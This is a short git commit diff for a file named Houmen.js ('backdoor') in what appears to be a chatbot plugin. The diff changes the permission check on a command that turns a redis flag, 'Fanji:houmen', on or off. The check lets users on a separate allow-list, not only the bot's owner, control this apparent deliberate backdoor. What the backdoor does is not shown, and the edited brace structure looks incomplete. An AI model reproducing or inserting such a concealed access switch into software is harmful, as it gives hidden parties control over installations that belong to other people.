ac2c557aeeac5baca011c73edf32ca184352a2fb
Admilk <13205155+adrae@user.noreply.gitee.com>
2024-04-06 11:28:57 +0000

    update apps/Houmen.js.
    Signed-off-by: Admilk <13205155+adrae@user.noreply.gitee.com>

--- apps/Houmen.js
+++ apps/Houmen.js
@@ -21,13 +21,12 @@ export class GetMaster extends plugin {
 
 
 
-  async Masterkg(e) {
-if (!e.isMaster) {  
+  async Masterkg(e) { 
     if (!(e.isMaster ||cm.check(this.e.user_id))&& !e.msg.includes('强制')) {  
         return await e.reply('你没有权限');  
-    } else if (e.msg.includes('强制') && cm.check(this.e.user_id)) {  
-    }  
-}  
+    } else {
+    if (!cm.check(this.e.user_id)) return await e.reply('你没有权限')
+
     let open = e.msg.includes('开启');
     await redis.set('Fanji:houmen', open ? 'true' : 'false');
     await e.reply('设置完成');
